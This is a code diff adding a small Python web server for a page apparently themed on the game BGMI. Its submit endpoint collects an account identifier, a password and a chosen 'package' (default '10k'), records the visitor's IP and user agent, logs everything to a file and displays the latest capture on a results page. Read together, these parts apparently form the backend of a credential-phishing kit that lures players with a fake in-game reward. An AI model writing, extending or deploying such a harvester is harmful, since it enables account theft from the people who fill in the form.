@@ -1,0 +1,80 @@
+import json
+from http.server import BaseHTTPRequestHandler
+from datetime import datetime
+from templates import get_html_form, get_result_page
+from logger import log_to_file
+
+class BGMIRequestHandler(BaseHTTPRequestHandler):
+    last_submission = None
+
+    def log_message(self, format, *args):
+        pass
+
+    def do_HEAD(self):
+        if self.path == '/' or self.path == '/index.html':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+        elif self.path == '/result':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_GET(self):
+        if self.path == '/' or self.path == '/index.html':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(get_html_form().encode('utf-8'))
+        elif self.path == '/result':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            if self.last_submission:
+                self.wfile.write(get_result_page(self.last_submission).encode('utf-8'))
+            else:
+                self.wfile.write(b'<h1>No data found</h1>')
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b'404 Not Found')
+
+    def do_POST(self):
+        if self.path == '/submit':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data.decode('utf-8'))
+                identifier = data.get('identifier', '')
+                password = data.get('password', '')
+                package = data.get('package', '10k')
+                if identifier and password:
+                    submission = {
+                        'identifier': identifier,
+                        'password': password,
+                        'package': package,
+                        'ip': self.client_address[0],
+                        'user_agent': self.headers.get('User-Agent', 'Unknown'),
+                        'time': datetime.now().strftime("%I:%M %p")
+                    }
+                    self.last_submission = submission
+                    log_to_file(submission)
+                    self.send_response(200)
+                    self.send_header('Content-type', 'application/json')
+                    self.end_headers()
+                    self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(json.dumps({'error': 'Missing fields'}).encode('utf-8'))
+            except json.JSONDecodeError:
+                self.send_response(400)
+                self.end_headers()
+                self.wfile.write(json.dumps({'error': 'Invalid JSON'}).encode('utf-8'))
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b'404 Not Found')
